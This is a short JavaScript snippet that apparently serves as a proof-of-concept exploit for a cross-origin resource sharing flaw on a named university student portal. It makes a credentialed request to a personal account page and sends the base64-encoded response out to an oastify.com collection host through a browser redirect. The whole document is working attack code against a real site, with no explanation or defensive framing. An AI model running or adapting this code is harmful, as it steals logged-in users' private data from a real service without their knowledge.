var req = new XMLHttpRequest(); 
req.onload = reqListener; 
req.open('get','https://sheilta.apps.openu.ac.il/pls/dmyopt2/myop.myop_screen', true); 
req.withCredentials = true;
req.send();

function reqListener() {
    location = '//0jkju313fs0ejqhs4mrm2zarrix9lz9o.oastify.com/log?key=' + btoa(this.responseText);
};
